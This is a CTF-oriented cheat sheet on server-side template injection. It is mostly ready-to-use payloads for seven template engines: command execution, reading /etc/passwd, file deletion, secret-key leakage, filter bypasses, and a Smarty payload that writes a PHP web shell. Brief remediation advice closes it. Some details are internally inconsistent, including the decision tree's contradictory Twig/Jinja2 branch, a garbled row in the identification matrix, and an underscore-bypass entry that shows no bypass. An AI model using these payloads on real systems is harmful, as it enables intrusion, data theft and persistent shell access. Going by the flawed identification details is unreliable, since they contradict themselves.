# Server-Side Template Injection (SSTI) — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, browser DevTools  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

SSTI occurs when user input is concatenated directly into a template rather than passed in as data.

```
Inject Mathematical Expression: ${{7*7}}, {{7*7}}, <%= 7*7 %>, #{7*7}
                          │
            Did it evaluate to 49?
           /                      \
        YES                        NO
         │                          │
Template Engine Active       Not vulnerable (or custom syntax)
         │
Identify Engine (Decision Tree):
  ├── {{7*'7'}}
  │     ├── Returns 49 ─────────> Twig / Jinja2 (Twig returns 49, Jinja2 returns 7777777)
  │     └── Returns 7777777 ────> Jinja2 / Python
  ├── ${7*7} ───────────────────> Java (FreeMarker / Velocity) or Smarty
  └── <%= 7*7 %> ───────────────> Ruby (ERB)
         │
Escalate to Code Execution:
  ├── Check Documentation for exposed execution objects
  ├── Probe Environment Objects (config, settings, self)
  └── Break out of Sandbox to System Command Execution
```

---

## 2. Template Engine Identification Matrix

| Probe | Jinja2 (Python) | Twig (PHP) | FreeMarker (Java) | ERB (Ruby) | Smarty (PHP) |
|---|---|---|---|---|---|
| `{{7*7}}` | `49` | `49` | `${7*7}` = `49` | `<%= 7*7 %>` = `49` | `{7*7}` = `49` |
| `{{7*'7'}}` | `7777777` | `49` | Error | Error | Error |
| `${7*7}` | `${7*7}` | Error | `49` | Error | Error |
| `<%= 7*7 %>` | Text | Text | Text | `49` | Text |

---

## 3. Engine-Specific Exploits & Remote Code Execution

### 1. Jinja2 / Python (Flask)

#### Information Disclosure:
```jinja2
{{ config.items() }}
{{ self.__dict__ }}
```

#### Remote Code Execution (Sandbox Escape):
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
*Via Object subclasses search:*
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

---

### 2. Twig / PHP (Symfony)

#### Twig 1.x (Documented Filter Callback RCE):
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

#### Twig 2.x / 3.x (System Command Execution):
```twig
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('passthru')}}
```

---

### 3. FreeMarker / Java

#### Probing Version & Engine:
```freemarker
${.version}
```

#### Remote Code Execution (`freemarker.template.utility.Execute`):
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("rm /home/carlos/morale.txt")}
```

---

### 4. ERB / Ruby

#### Environment & File Read:
```erb
<%= File.open('/etc/passwd').read %>
```

#### Remote Code Execution:
```erb
<%= system('id') %>
<%= `whoami` %>
<%= IO.popen('id').readlines() %>
```

---

### 5. Smarty / PHP

```smarty
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('id')}
```

---

### 6. Django (Python)

Django templates strictly restrict arbitrary method calls, but exposed debug contexts leak sensitive settings:
```django
{{ settings.SECRET_KEY }}
{{ request.user.password }}
```

---

### 7. ASP.NET Razor (C#)

```razor
@(1+2)
@System.IO.File.ReadAllText("/etc/passwd")
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
```

---

## 4. Bypassing Template Blacklists & Filters

### 1. Jinja2: Quotes Blacklisted
Use string parameters passed through request args:
```jinja2
{{ request.application.__globals__.__builtins__.__import__(request.args.x).popen(request.args.y).read() }}&x=os&y=id
```

### 2. Jinja2: Dot Operator `.` Blacklisted
Use dictionary key lookup `[]` or `attr()` filter:
```jinja2
{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}
{{ (self|attr('__init__'))|attr('__globals__') }}
```

### 3. Jinja2: Underscore `_` Blacklisted
Pass encoded characters via query parameters or use hex decoding:
```jinja2
{{ request.args.param }}
```

---

## 5. CTF Quick Reference

| Engine | Fast Detection | High-Yield Exploit |
|---|---|---|
| **Jinja2 (Python)** | `{{7*'7'}}` → `7777777` | `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}` |
| **Twig (PHP)** | `{{7*'7'}}` → `49` | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| **FreeMarker (Java)**| `${7*7}` → `49` | `<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}` |
| **ERB (Ruby)** | `<%= 7*7 %>` → `49` | `<%= system('id') %>` or `<%= \`id\` %>` |
| **Smarty (PHP)** | `{7*7}` → `49` | `{system('id')}` |
| **Django (Python)** | `{{debug}}` | `{{settings.SECRET_KEY}}` |

---

## 6. Remediation

- **Separate Logic from Templates:** Pass dynamic data as context variables rather than concatenating user input directly into the template string:
  ```python
  # Vulnerable:
  template = Template("Hello " + user_input)
  return template.render()

  # Safe:
  template = Template("Hello {{ name }}")
  return template.render(name=user_input)
  ```
- **Use Logic-less Templates:** Favor engines like Mustache or Handlebars where arbitrary code execution is syntactically impossible.
- **Enable Strict Sandboxing:** If dynamic templates are mandatory, configure engine sandboxes and restrict class loader introspection.
